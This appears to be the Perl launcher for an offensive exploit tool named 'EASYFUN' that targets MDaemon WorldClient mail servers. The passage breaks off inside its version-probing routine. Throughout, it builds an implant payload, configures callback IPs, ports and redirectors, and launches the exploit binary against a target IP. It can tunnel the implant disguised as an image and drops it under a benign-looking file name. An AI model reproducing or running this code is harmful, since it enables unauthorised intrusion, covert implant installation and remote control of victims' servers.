

use strict;
use vars qw($VERSION);

$::VERSION = "EASYFUN Script: 2.2.0.1";
print "\n\n$::VERSION\n\n";



use FindBin;				
use lib "$FindBin::Bin";	
use Getopt::Long;			
use Cwd;					

use IO::Socket; 
use Socket;

use lib "$FindBin::Bin\\..\\..\\Resources\\Perl";
use ExploitUtils qw(
	$EU_LOGFILE
	$EU_VERBOSE
	$EU_BATCHMODE
	EU_LogInit
	EU_Log
	EU_ExitMessage
	EU_GetInput
	EU_GetExistingDir
	EU_GetIP
	EU_GetLocalIP
	EU_GetRootDir
	EU_GetPort
	EU_RunCommand
	EU_GetAddr
	EU_StopServices
);


use vars qw($RIDEAREA $PAYLOAD_DLL $PAYLOAD_EXE $EXPLOIT_EXE @DEPFILES);


my @knownWCVersions = 
(
	{string => "No version", num => 0}
);

my @knownIISVersions = 
(
	{string => "No version", num => 0}
);



my	%opts = ();
GetOptions(\%opts, "v", "h", "q|?", "b", "e=s", "f=s", "d=s", "t=s", "l=s", "c=s", "x=s") or &print_script_usage(0);

if (scalar(@ARGV) > 0 ) {
  &EU_Log(1, "Extraneous arguments found on command line: @ARGV");
  &EU_Log(1, "Arguments will be ingnored");
  while(@ARGV) {shift;}
}

if (!defined($opts{"e"})) {
	&EU_Log(1, "A -e option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"f"})) {
	&EU_Log(1, "A -f option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"x"})) {
	&EU_Log(1, "A -x option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"l"})) {
	&EU_Log(1, "A -l option must be supplied.");
	&print_usage(0);
}

$::RIDEAREA	= "Resources\\Tools\\ridearea2.exe";	
$::LP_DLL	= "$opts{l}";					
$::PAYLOAD_DLL	= "$opts{f}";				
$::PAYLOAD_EXE	= "$opts{x}";				
$::EXPLOIT_EXE	= "$opts{e}\\eafu.exe";					

$::CALLBACK_NONE			= "0";			
$::CALLBACK_NEW				= "1";			
$::CALLBACK_REUSE_UPLOAD	= "2";			
$::CALLBACK_REUSE_ENTIRE	= "3";			


my $work_dir       = $opts{"d"} if (defined $opts{"d"});
my $root_dir       = $opts{"c"} if (defined $opts{"c"});
my $TargetIp       = $opts{"t"} if (defined $opts{"t"});

@DEPFILES = ($::RIDEAREA, $::EXPLOIT_EXE);



my	$logfile_prefix		= "EAFU_";			
my	$logfile_suffix		= "_script.log";	
my	$filename_suffix	= "_payload.bin";	

my	$SocketIp			= $TargetIp;		
my	$SocketPort			= 0;				
my	$CallbackOption		= 0;				
my	$CallbackIp			= 0;				
my	$CallbackPort		= 0;				
my	$TimeOutValue		= 0;				

my	$PayloadFile		= "";				
my	$PayloadType		= "";				
my	$LocalIp			= 0;				

my $UserName = "";
my $Password = "";
my $TargetPort = 0;
my $TargetWCVersion = 0;
my $TargetIISVersion = 0;
my $TargetBeta = "";
my $TargetLanguage = "";
my $DropFileName = "";
my $Target9x = "";
my $TargetHttps = "";
my $exploit_dir = "$opts{e}";
my $fhttp = 0;
my $callbackUrl = "";
my $WCVersionStr;
my $versionsFilename = "targetversions.cfg"; 

my $ImplantPayload = "";

&print_usage(1) if (defined $opts{"h"});	
&print_usage(0) if (defined $opts{"q"});	

$ExploitUtils::EU_VERBOSE   = 1 if (defined $opts{"v"});	
$ExploitUtils::EU_BATCHMODE = 1 if (defined $opts{"b"});	



if ($ENV{"OS"} ne "Windows_NT") {
    &EU_ExitMessage(1,"This script requires Windows NT-based platform.");
}


$work_dir = &EU_GetExistingDir("Enter pathname for operation's working directory", $work_dir, 1);
$root_dir = &EU_GetRootDir($root_dir,@::DEPFILES);



&EU_LogInit($logfile_prefix, $logfile_suffix, $work_dir);
&EU_Log(0,"$::VERSION");



&EU_Log(0,"\nChanging to working directory: $work_dir");
chdir $work_dir || &EU_ExitMessage(1,"Unable to change to working directory: $work_dir");






($SocketIp, $SocketPort, $CallbackOption, $PayloadFile, $PayloadType, $TimeOutValue, $CallbackIp, $CallbackPort, $UserName, $Password, $TargetPort, $TargetHttps, $TargetWCVersion, $TargetIISVersion, $TargetBeta, $TargetLanguage, $DropFileName, $Target9x, $fhttp, $callbackUrl) =
	&validate_parms($work_dir, $root_dir, $SocketIp, $SocketPort, $CallbackOption, $PayloadFile, $PayloadType, $TimeOutValue, $CallbackIp, $CallbackPort);



&EU_ExitMessage(0,"\nUser terminated script")  if ($TargetWCVersion == 0 );

my $answer;
if(!$EU_BATCHMODE) {
	$answer = &EU_GetInput("\nReady to begin exploit ([y],n,quit)? ", "y");
	&EU_ExitMessage(0,"User terminated script")  if ($answer ne "y" and $answer ne "Y");
}



my $payload_name_format = "${work_dir}\\${logfile_prefix}%04d%02d%02d_%02d%02d%02d${filename_suffix}"; 
my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = gmtime(time);

$year += 1900;
$mon  += 1;

my $RA_Payload = sprintf($payload_name_format,$year,$mon,$mday,$hour,$min,$sec);
my $CommandString = "";

if ($Target9x eq "n") {
	$CommandString = "\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -t m -l m";
	if( $CallbackOption eq $::CALLBACK_NONE ) {
		$CommandString = $CommandString . " -f 13 -a 3";
	}
	elsif( $CallbackOption eq $::CALLBACK_NEW ) {
		$CommandString = $CommandString . " -f 17 -a 8";
	}
 
	if ( $PayloadType eq "e") {
	    $CommandString = $CommandString . " -d $DropFileName";
	}


	&EU_RunCommand($CommandString);
}
else {
	&EU_Log(1, "\nTarget is Windows 9x.  Building the 'drop executable' payload.");
	if ($PayloadType eq "e") {
		&EU_RunCommand("\"$root_dir\\$exploit_dir\\9xPayload.exe\" -i \"$PayloadFile\" -o \"$RA_Payload\"");
	} else {
		&EU_ExitMessage(0, "Can't run the ExpandingPulley DLL on a 9x target.\n");
	}
}


my $flags = "";
#my $flags;
#if($ExploitUtils::EU_VERBOSE) { $flags = "-v"; }
#else { $flags = ""; }

if ($fhttp == 1) {
	&EU_StopServices("W3SVC");
	$flags = "-h \"$callbackUrl\"";
}

my $ImplantPayload = $RA_Payload ;



my ($tsec, $tmin, $thour, $tdate, $tmonth, $tyear, $twday, $tyday, $tisdst) = localtime (time);
$tyear += 1900;
$tmonth  += 1;



my $logfileformat = "$work_dir\\$logfile_prefix%04d%02d%02d_%02d%02d%02d_exe.log"; 
my $log_filename = sprintf ($logfileformat, $tyear, $tmonth, $tdate, $thour, $tmin, $tsec);


$CommandString = "start \"EF Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\""
	. " -i $SocketIp"
	. " -p $SocketPort"
	. " -c $CallbackOption"
	. " -I $CallbackIp"
	. " -P $CallbackPort"
	. " -f \"$ImplantPayload\""
	. " -l \"$root_dir\\$::LP_DLL\""
	. " -o $TimeOutValue -u $UserName"
	. " -w $Password"
	. " -t $TargetIp"
	. " -r $TargetPort"
	. " -v $TargetWCVersion"
	. " -s $TargetIISVersion"
	. " -a $TargetLanguage"
	. " -9 $Target9x $flags"
	. " -m $TargetHttps"
	. " -L \"$log_filename\""
	. " -V \"$versionsFilename\"";

if ($TargetBeta ne "") {																																									
	$CommandString = $CommandString . " -b $TargetBeta";
}

&EU_Log(1,"\nUsing command line string \n***********\n$CommandString\n***********\n");
&EU_Log(1,"\nExploit will launch in a separate window. Follow the status messages");
&EU_Log(1,"in the new window to determine if it succeeds.");
&EU_Log(1,"\nLaunching exploit...");


&EU_RunCommand($CommandString);




my $cur_dir = cwd();
chdir $cur_dir || &EU_ExitMessage(1,"Unable to switch back to initial directory: $cur_dir");

&EU_ExitMessage(0,"\nDone with $::0.");






sub print_usage() {
	my ($verbose) = @_;
	print "$::VERSION\n";

	print qq~
Usage: $::0 [-v] [-h] [-?] [-b]
             [-d <working directory>] [-e <exploits directory>]
             [-t <target IP>] [-f <payload dll>] [-l <lp dll>]
	 
~;

	if ($verbose) {
		print qq~

  -v                    verbose mode. Default non-verbose mode.

  -h                    Print this help information.

  -?                    Print abbreviated help information.

  -b                    Batch (non-interactive) mode. Default interactive mode.

  -d <working directory> Working Directory
                        Top-level directory where operation's files will be
                        generated. Default E:\.

  -e <exploits directory> Exploits Directory
                        Top-level directory containing exploit files.
						Default one directory up from directory containing this script.

  -t <target IP>        Target IP address.
                        Default derived as last part of working directory name.

  -f <payload dll>      Filename of the implant payload.

  -x <payload exe>      Filename of the implant payload exe.

  -l <lp dll>           Filename of the listening post dll.

~;
	}

	&EU_ExitMessage(1,"End of help.");
}


sub validate_parms() {
	my ($work_dir, $root_dir, $SocketIp, $SocketPort, $CallbackOption, $PayloadFile, $PayloadType, $TimeOutValue, $CallbackIp, $CallbackPort) = @_;
	my ($continue, $retcode, $IISretcode, $vol, $dir);
	my ($redirectFlag, $LocalIp);
	my ($UserName, $Password, $TargetPort, $TargetWCVersion, $TargetIISVersion, $TargetBeta, $TargetLanguage);
	my $DropFileName = "spcss32.exe";
	my $Target9x = "n";
	my $TargetIIS = "n";
	my $TargetHttps = "n";
	my $en = 0;
	my $es = 0;
	my $fr = 0;
	my $ge = 0;
	my $jp = 0;
	my $it = 0; 
	my $pt = 0; 
	my $ru = 0;
	my $ch = 0; 
	my $ar = 0;	
	my $i = 0;
	my $fhttp = 0;
	my $callbackUrl = "";

	my $v_index; 

	$LocalIp = &EU_GetLocalIP("Enter the local IP Address", $LocalIp);
	&EU_Log(0, "Enter the local IP Address:  $LocalIp");

	while (1) {



		&EU_Log(1,"\nSelect Payload file to send:\n");
		&EU_Log(1,"   0) $::PAYLOAD_DLL");		
		&EU_Log(1,"   1) $::PAYLOAD_EXE");	
		&EU_Log(1,"   2) Arbitrary Executable");
			
		while(1) {
			$retcode = &EU_GetInput("\nEnter selection [0]: ", "0");
			&EU_Log(0, "\nEnter selection [0]: $retcode");

			if($retcode eq "0") {
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_DLL\n");
				$PayloadFile = $::PAYLOAD_DLL;
				$PayloadType = "d";

				&EU_Log(1, "\nWill use a new socket to callback and do everything else.\n");
				$CallbackOption = $::CALLBACK_NEW;

			}
			elsif($retcode eq "1") { 
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_EXE\n");
				$PayloadFile = $::PAYLOAD_EXE;
				$PayloadType = "e";

				&EU_Log(1, "\nWill use a new socket to callback and upload the implant only.\nThe exploit will not automatically launch its own listening post.\n");
				$CallbackOption = $::CALLBACK_REUSE_UPLOAD;
			}
			elsif($retcode eq "2") {
				$PayloadFile = &EU_GetInput("Enter the full pathname of the executable you wish to run on the target: ");
				$DropFileName = &EU_GetInput("Enter the filename as it should appear on the target [msregstr.exe]: ", "msregist.exe");
				$PayloadType = "e";

				for (
					$CallbackOption=0; 
					$CallbackOption < 1 or $CallbackOption > 3; 
					
				)
				{
					&EU_Log(1, 
						"\nSelect callback option:" .
						"\n\t$::CALLBACK_NEW) Create a new socket for the callback and everything else that happens thereafter." .
						"\n\t$::CALLBACK_REUSE_UPLOAD) Reuse the same exploit socket in order to upload the implant only (recommended for exe payload)." .
						"\n\t$::CALLBACK_REUSE_ENTIRE) Reuse the same exploit socket for the entirety of the operation.\n"
						);
					$CallbackOption = &EU_GetInput("\nEnter selection for callback option[$::CALLBACK_REUSE_UPLOAD]: ", "$::CALLBACK_REUSE_UPLOAD");
				}

				&EU_Log(1, "\nWill use a new socket to callback and do everything else.\n");
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		}


		$retcode = &EU_GetInput("\nWill this operation be REDIRECTED (y,[n])? ", "n");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { $redirectFlag = 1; }
		else { $redirectFlag = 0; }



		if( $redirectFlag == 0 ) {

			$SocketPort = 3000;		
			

			$SocketIp = &EU_GetIP("\nEnter the target IP Address", $SocketIp);
			&EU_Log(0, "Enter the target IP Address:  $SocketIp");

			$SocketPort = &EU_GetPort("\nEnter the target Port", $SocketPort);
			&EU_Log(0, "Enter the target Port:  $SocketPort");


			&EU_Log(1, "\nThe EF Exploit Payload must callback in order to upload the Implant Payload.");

			&EU_Log(1, "The local IP Address should be used as the callback IP Address.");

			$TargetPort = $SocketPort;	
		
		}

		else {


			$SocketIp = &EU_GetIP("\nEnter the redirection IP Address", "127.0.0.1");
			&EU_Log(0, "\nEnter the redirection IP Address:  $SocketIp");

			$SocketPort = &EU_GetPort("Enter the redirection Port");
			&EU_Log(0,"Enter the redirection Port: $SocketPort");

			$TargetPort = &EU_GetPort("Enter the TARGET port");
			&EU_Log(0, "Enter the port the target is listening on");
			
			&EU_Log(1, "\nThe EF Exploit Payload must callback in order to");
			&EU_Log(1, "upload the Implant Payload.  The callback IP Address MUST be that of");
			&EU_Log(1, "the Redirector.  The callback Port MUST be the same number on both");
			&EU_Log(1, "the Redirector and the local machine, else redirection will fail.");
			&EU_Log(1, "The local machine uses this port to listen for the callback, and the");
			&EU_Log(1, "EF Exploit Payload uses it to call back to the Redirector.");

			&EU_Log(1, "\nThe redirection IP Address should be used as the callback IP Address.");
		}

		$TargetHttps = &EU_GetInput("\nIs the target using a secure connection? (y, [n]) ", "n");

		if( ($TargetHttps eq "y") or ($TargetHttps eq "yes") or ($TargetHttps eq "Y") or ($TargetHttps eq "YES") ) 
		{
			$TargetHttps = "y";
		} 


		$CallbackIp = &EU_GetLocalIP("\nEnter the callback IP Address", $LocalIp);
		&EU_Log(0, "Enter the callback IP Address:  $CallbackIp");

		for (
			$CallbackPort = -1; 
			$CallbackPort < 1 or $CallbackPort > 65535;
		) 
		{
			$CallbackPort = &EU_GetPort("\nEnter the callback Port.  (Use 0 to generate a random port between 1 and 65535 -- not recommended).", 0);

			if (0 == $CallbackPort)
			{
				$CallbackPort = int rand (65534);
				$CallbackPort += 1;
			}
		}

		&EU_Log (1, "\nUsing callback port $CallbackPort\n");


		&EU_Log(1, "\nThe default time-out value for the target connection is 60 sec.");
		&EU_Log(1, "(You may want to increase this value if the network is exceptionally slow.)");
		$retcode = &EU_GetInput("Use default value of 60 sec ([y],n)? ", "y");
		&EU_Log(0, "Use default value of 60 sec ([y],n)?  $retcode");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") or ($retcode eq "60") ) {
			$TimeOutValue = "60";
		}
		else {
			$TimeOutValue = &EU_GetInput("Enter new time-out value (greater than 60): ");
			&EU_Log(0, "Enter new time-out value (greater than 60):  $TimeOutValue");
		}


		&EU_Log(1, "\nYou can send the implant by having the target make an HTTP request to the callback IP address.  Your machine will reply by uploading the implant wrapped inside well-formed HTML that will claim that the implant is actually an image.\n");
		&EU_Log(1, "If you do not use HTTP tunneling then the target will callback with a 4-byte authentication code to which your machine will reply by uploading the implant.\n");
		&EU_Log(1, "Using HTTP tunneling will cause the socket to be closed after the implant has been uploaded, so you will need to start your own listening post.\n");
		$retcode = &EU_GetInput("\nUse HTTP tunneling for the callback connection? (y,[n])? ", "n");
		&EU_Log(0, "Use HTTP tunneling for the callback connection? (y,[n])?  $retcode");
		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ){
			$fhttp = 1;
		}
		if ($fhttp) {
			$callbackUrl = "http://$CallbackIp";
			if ($CallbackPort == 80 or $CallbackPort eq "80") {
				$callbackUrl .= "/";
			} else {
				$callbackUrl .= ":$CallbackPort/";
			}
			&EU_Log(1, "Based on the parameters, I think the callback URL should be:\n$callbackUrl");
			$retcode = &EU_GetInput("Is this correct? ([y], n)", "y");
			if( ($retcode eq "n") or ($retcode eq "no") or ($retcode eq "N") or ($retcode eq "NO") ){
				$callbackUrl = &EU_GetInput("Enter the callback URL: ", "");
			}
		}


		$TargetWCVersion = 0;
		$TargetIISVersion = 0;
		$TargetBeta = "";
		$TargetLanguage = "en";		
		my $needLang = 0;

		&EU_Log(1, "\n\nNow we will determine the version of WorldClient that will be exploited.\n");

		while(1)
		{

			while (1)
			{
				my (@linesFromVfile, $wcv, @WCversions, @IISversions);
				my $numVersions = 0;
				$versionsFilename = &EU_GetInput("\nEnter the filename of the list of WorldClient versions ([$versionsFilename])", $versionsFilename);
				$versionsFilename = "$root_dir\\$opts{e}\\$versionsFilename" ;
				open (VERSIONS, $versionsFilename) 
				or die ("\nFailed to open file <$versionsFilename>.\n")	;

				&EU_Log (1, "\nUsing file <$versionsFilename> to get a list of supported WorldClient versions.\n");
				@linesFromVfile = <VERSIONS>;
				close (VERSIONS);


				@WCversions = grep (/^Version \d\d?\.\d\.\d/, @linesFromVfile);

				for ($v_index = 0; $v_index < @WCversions; $v_index+=1)
				{	
					$WCversions[$v_index] =~ /(\d\d?)\.(\d)\.(\d)/;
					$knownWCVersions[$v_index+1]->{string} = "$1.$2.$3";
					$knownWCVersions[$v_index+1]->{num} = "$1$2$3" + 0;
				}


				@IISversions = grep (/^IIS \d\d?\.\d/, @linesFromVfile);

				for ($v_index = 0; $v_index < @IISversions; $v_index+=1)
				{	
					$IISversions[$v_index] =~ /(\d\d?)\.(\d)/;
					$knownIISVersions[$v_index+1]->{string} = "$1.$2";
					$knownIISVersions[$v_index+1]->{num} = "$1$2" + 0;
				}

				if (@WCversions > 0) {last;}
			}

			while( 1 )
			{
				$retcode = &Yes_No("\nWould you like to probe the target for its WorldClient version ([y],n)? ","y");

				if ( $retcode eq "y") 
				{

					($TargetWCVersion, $WCVersionStr, $TargetIISVersion) = &Probe_WorldClient( $SocketIp, $SocketPort, $TargetHttps );

					if ( $TargetWCVersion eq -1 )
					{
						$TargetWCVersion = 0;
						&EU_Log(1, "\nThe touch tool has detected that $WCVersionStr");
						$retcode = &Yes_No("\nWould you like to probe again (y,[n])? ","n");
						if ( $retcode eq "y" )
						{
							next;
						}
						else
						{
							$retcode = &Yes_No("\nWould you like terminate this script (y,[n])? ","n");
							if ( $retcode eq "n" )
							{
								last;
							}
							else
							{
								return;
							}
						}
					}
					elsif ( $TargetWCVersion eq 0 )
					{
						&EU_Log(1, "\nThe touch tool has detected that $WCVersionStr");
						last;
					}
					else
					{
						&EU_Log(1, "\nThe touch tool has detected that $WCVersionStr is running on the target.");
						$retcode = &Yes_No("\nAre you happy with this result ([y],n) ? ","y");
						if( $retcode eq "y" )
						{
							last;
						}
						else
						{
							$TargetWCVersion = 0;
						}
					}
				}
				last;
			}

			if ( $TargetWCVersion eq 0 )
			{
				while( 1 )
				{

					&EU_Log(1, "\nYou are about to be asked for the target MDaemon version.");
					&EU_Log(1, "If you are unsure about these values, you should banner MDaemon");  
					&EU_Log(1, "25, 110, 143, WorldClient - 3000 (by default). ");
					&EU_Log(1, "In general the WorldClient version is the same as the MDaemon version.");
					&EU_Log(1, "* Currently only v3.0.4 is the exception which has a WC v3.0.2.*");
					&EU_Log(1, "\n\tMDaemon Version");
					&EU_Log(1, "\t---------");

					my $vmax = @knownWCVersions;

					for ($v_index=1; $v_index < $vmax; $v_index++)
					{&EU_Log(1, "\t $v_index) ".$knownWCVersions[$v_index]->{string}); }

				
					$retcode = &EU_GetInput("\nSelect a target version [0]: ", 0 );

					&EU_Log(0, "Select a target version [0]: $retcode");

					if ( $retcode <= 0 or $retcode >= @knownWCVersions )
					{
						&EU_Log(1, "\nInvalid option. Try again *.\n");
						next 
					}
					last;
				} 


				$TargetIIS = &EU_GetInput("\nIs the target machine configured to use WorldClient via IIS? (y, [n]) ", "n");

				if ( $TargetIIS eq 'y'  )
				{
					while ( 1 )
					{
						&EU_Log(1, "\nPlease select the version of IIS used by the target:");
						&EU_Log(1, "\n\tIIS Version");
						&EU_Log(1, "\t-----------");
						&EU_Log(1, "\t 0) IIS Not Used");
						&EU_Log(1, "\t 3) IIS 6.0");
						$IISretcode = &EU_GetInput("\nSelect an IIS Version [0]: ", "0");

						if ( $IISretcode < 0 or $IISretcode > 4 )
						{
							&EU_Log(1, "\nInvalid option. Try again.\n");
							next 
						}
					
						last;
					};

					if ( $IISretcode == 0 )
					{
						$TargetIISVersion = 0;
					}
					elsif ( $IISretcode != 3 )
					{
						&EU_Log(1, "\nOnly IIS 6.0 is currently supported!.\n");
						return;
					}
					else
					{
						$TargetIISVersion = 60;
					}
				}
			}


			for ($v_index=1; $v_index<@knownWCVersions; $v_index++)
			{
				if(	$retcode == $v_index 
					or 
					$TargetWCVersion == $knownWCVersions[$v_index]->{num} ) 
				{
					$TargetWCVersion = $knownWCVersions[$v_index]->{num};
					last;
				}

			}
			if ($v_index >= @knownWCVersions)
			{ 
				&EU_Log(1, "\nInvalid option. Try again +.\n");
				next 
			}
			last;
		}


		if ($TargetIISVersion)
		{
			$needLang = 1;
			$en = 1;
			$ch = 1;
			$ar = 1;
		}


		$Target9x = &EU_GetInput("\nIs the target machine Windows 95, 98, or ME? (y, [n]) ", "n");

		if ( $Target9x eq 'y'  )
		{
			

			if ( $TargetWCVersion eq 684 )
			{
				$needLang = 1; 
				$ru = 0;
				$jp = 0;
				$ge = 0;
				$fr = 0;
			}
		}


		&EU_Log(1, "");
		if ($needLang) 
		{
			&EU_Log(1, "\nYou are about to be asked for the target MDaemon language.");
			&EU_Log(1, "If you are unsure about these values, you should banner MDaemon");  
			&EU_Log(1, "25, 110, 143, WorldClient - 3000.");
			&EU_Log(1, "E.g. 'ready' = English, 'listo' = Spanish.\n");
				
			while(1)
			{
				if ($en) { &EU_Log(1, "\t1) English"); }
				if ($es) { &EU_Log(1, "\t2) Spanish"); }
				if ($ge) { &EU_Log(1, "\t3) German"); }
				if ($fr) { &EU_Log(1, "\t4) French"); } 
				if ($jp) { &EU_Log(1, "\t5) Japanese"); } 
				if ($ru) { &EU_Log(1, "\t6) Russian"); } 
				if ($pt) { &EU_Log(1, "\t7) Polish"); } 
				if ($it) { &EU_Log(1, "\t8) Italian"); } 
				if ($ch) { &EU_Log(1, "\t9) Chinese"); } 
				if ($ar) { &EU_Log(1, "\t10) Arabic"); } 

				$retcode = &EU_GetInput("\nSelect a target language [1]: ", 1);

				if(	( $retcode < 1 ) or ( $retcode > 10 ) )
				{ 
					&EU_Log(1, "\nInvalid option. Try again.\n");
					next 
				}
				else
				{
					if( $retcode == 1 )
						{ $TargetLanguage = "en"; }
					elsif( $retcode == 2 ) 
						{ $TargetLanguage = "es"; }
					elsif( $retcode == 3 ) 
						{ $TargetLanguage = "ge"; }
					elsif( $retcode == 4 ) 
						{ $TargetLanguage = "fr"; }
					elsif( $retcode == 5 ) 
						{ $TargetLanguage = "jp"; }
					elsif( $retcode == 6 ) 
						{ $TargetLanguage = "ru"; }
					elsif( $retcode == 7 ) 
						{ $TargetLanguage = "pl"; }
					elsif( $retcode == 8 ) 
						{ $TargetLanguage = "it"; }
					elsif( $retcode == 9 ) 
						{ $TargetLanguage = "ch"; }
					elsif( $retcode == 10 ) 
						{ $TargetLanguage = "ar"; }
				}
				last
			}
		}



		&EU_Log(1, "\nValid MDaemon usernames are email addresses, e.g. user\@network.com.");
		$UserName = &EU_GetInput("Enter a valid username: ");
		$Password = &EU_GetInput("\nEnter the password for $UserName: ");




		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory      : $root_dir");
		&EU_Log(1,"\tLocal IP            : $LocalIp");
		&EU_Log(1,"\tTarget WC Version   : $TargetWCVersion$TargetBeta");
		
		if ($TargetIISVersion > 0)
		{
			&EU_Log(1,"\tTarget IIS Version  : $TargetIISVersion");
		}

		&EU_Log(1,"\tTarget Language     : $TargetLanguage");
		&EU_Log(1,"\tUserName            : $UserName");
		&EU_Log(1,"\tPassword            : $Password");
		&EU_Log(1,"\tTarget is Win 9x    : $Target9x");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection   : True");
			&EU_Log(1,"\tRedirector IP       : $SocketIp");
			&EU_Log(1,"\tRedirector Port     : $SocketPort");
			&EU_Log(1,"\tTarget Port         : $TargetPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection   : False");
			&EU_Log(1,"\tTarget IP           : $SocketIp");
			&EU_Log(1,"\tTarget Port         : $SocketPort");
		}
		&EU_Log(1,"\tCallback IP         : $CallbackIp");
		&EU_Log(1,"\tCallback Port       : $CallbackPort");
		&EU_Log(1,"\tUsing HTTP Tunneling: $fhttp");
		&EU_Log(1,"\tCallback URL        : $callbackUrl");
		&EU_Log(1,"\tNetwork Time Out    : $TimeOutValue sec");

		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			last;
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}

	} 



	return ($SocketIp, $SocketPort, $CallbackOption, $PayloadFile, $PayloadType, $TimeOutValue, $CallbackIp, $CallbackPort, $UserName, $Password, $TargetPort, $TargetHttps, $TargetWCVersion, $TargetIISVersion, $TargetBeta, $TargetLanguage, $DropFileName, $Target9x, $fhttp, $callbackUrl);
}

sub Probe_WorldClient()
{
	my ( $TargetIP, $TargetPort, $TargetHttps) = @_;

	my $HTTPRequest = "GET / HTTP/1.1\r\nHost:\r\n\r\n";
	my $HTTPResponse;
	my $ResponseHeader;
	my $WCVer = 0;
	my $IISVer = 0;
	my $WCStr = "";
	my $socket = -1;
	my $touchedWCversion = "";
	my $touchedIISversion = "";

	my $v_index;

	&EU_Log(1, "\n\n*************** WorldClient Touch Tool ***************\n\n" );

	if($TargetHttps eq "y") 
	{		
		my @eafu_ssl_args = "$TargetIP $TargetPort";
		
		$WCVer = &EU_RunCommand("\"$root_dir\\$opts{e}\\EAFU_SSL_exe\\EAFU_SSL.exe\" @eafu_ssl_args\"");

		while(!$touchedWCversion) 
		{  
			$touchedWCversion = &EU_GetInput("\nRE-ENTER the WorldClient versions number seen above: ", $touchedWCversion);
		}
		$touchedIISversion = &EU_GetInput("\nIf WorldClient was found to be running through IIS\nRE-ENTER the IIS versions number seen above\nIf not hit enter: ", $touchedIISversion);

		if( $touchedWCversion =~ /\d\d?\.\d\.\d/) 
		{
			
			for ($v_index=0; $v_index<@knownWCVersions; $v_index++)
			{
				if ($touchedWCversion eq $knownWCVersions[$v_index]->{string})
				{
					&EU_Log(1,"\nWorldClient version supported\n" );
					$WCVer = $knownWCVersions[$v_index]->{num}; 
					$WCStr = "WorldClient Version ".$knownWCVersions[$v_index]->{string};
					last;
				}	
			}
			if    ($v_index >= @knownWCVersions )
			{ $WCVer= 0; $WCStr = "WorldClient Version is currently not supported"; }
		}
		else 
		{
			$WCVer= -1; $WCStr= "the WorldClient version was not typed in correctly\n";
		}
		if( $touchedIISversion =~ /\d\d?\.\d/ )
		{
				for ($v_index=0; $v_index<@knownIISVersions; $v_index++)
				{
					if ($touchedIISversion eq $knownIISVersions[$v_index]->{string})
					{
						$IISVer = $knownIISVersions[$v_index]->{num}; 
						$WCStr .= " configured with IIS ".$knownIISVersions[$v_index]->{string};
						last;
					}
				}

				if ($v_index >= @knownWCVersions )
				{
					$WCVer = 0;
					$IISVer = 0;
					$WCStr .= " is configured with an unsupported version of IIS";
				}

		}
	}
	else 
	{
		&EU_Log(1, "Connecting to $TargetIP : $TargetPort\n" );
		$socket = &do_connect($TargetIP , $TargetPort, $socket);

	if ($socket == -1) 
	{ 
		$WCVer= -1; $WCStr= "it was unable to connect to $TargetIP:$TargetPort";
	}
	else
	{
		&EU_Log(1, "Connected to $TargetIP : $TargetPort\n");

		print $socket "$HTTPRequest";

		$HTTPResponse = ""; 
		while(<$socket>) { $HTTPResponse .= $_; } 

		$HTTPResponse =~ /HTTP\/1.[0-1].*(\r\n){2}/s;
		&EU_Log(1, "\n\n$&" );

		if (	$HTTPResponse =~ /HTTP\/1\.[0-1] 200 OK/ and
			$HTTPResponse =~ /Server: WDaemon\/(\d\d?\.\d\.\d)/) 
		{
			&EU_Log(1, "Found WorldClient version $1\n");
			$touchedWCversion = $1;
			
			for ($v_index=0; $v_index<@knownWCVersions; $v_index++)
			{
				if ($touchedWCversion eq $knownWCVersions[$v_index]->{string})
				{
					&EU_Log(1,"WorldClient version supported\n" );
					$WCVer = $knownWCVersions[$v_index]->{num}; 
					$WCStr = "WorldClient Version ".$knownWCVersions[$v_index]->{string};
					last;
				}
			}

			if    ($v_index >= @knownWCVersions )
			 { $WCVer= 0; $WCStr = "WorldClient Version is currently not supported"; }


			&EU_Log(1,"\n\t$WCStr" );

			close( $socket );
		}

		elsif (	$HTTPResponse =~ /HTTP\/1\.[0-1] 200 OK/ and 
			    $HTTPResponse =~ /Server: Microsoft-IIS\/(\d\d?\.\d).*MDaemon\/WorldClient.*v(\d\d?\.\d\.\d)/s )
		{
			$touchedIISversion = $1;
			$touchedWCversion = $2;
			
			for ($v_index=0; $v_index<@knownWCVersions; $v_index++)
			{
				if ($touchedWCversion eq $knownWCVersions[$v_index]->{string})
				{
					$WCVer = $knownWCVersions[$v_index]->{num}; 
					$WCStr = "WorldClient Version ".$knownWCVersions[$v_index]->{string};
					last;
				}
			}

			if ($v_index >= @knownWCVersions )
			{ 
				$WCVer = 0;
				$WCStr = "WorldClient Version is currently not supported"; 
			}
			else
			{
				for ($v_index=0; $v_index<@knownIISVersions; $v_index++)
				{
					if ($touchedIISversion eq $knownIISVersions[$v_index]->{string})
					{
						$IISVer = $knownIISVersions[$v_index]->{num}; 
						$WCStr .= " configured with IIS ".$knownIISVersions[$v_index]->{string};
						last;
					}
				}

				if ($v_index >= @knownWCVersions )
				{
					$WCVer = 0;
					$IISVer = 0;
					$WCStr .= " is configured with an unsupported version of IIS";
				}
			}			

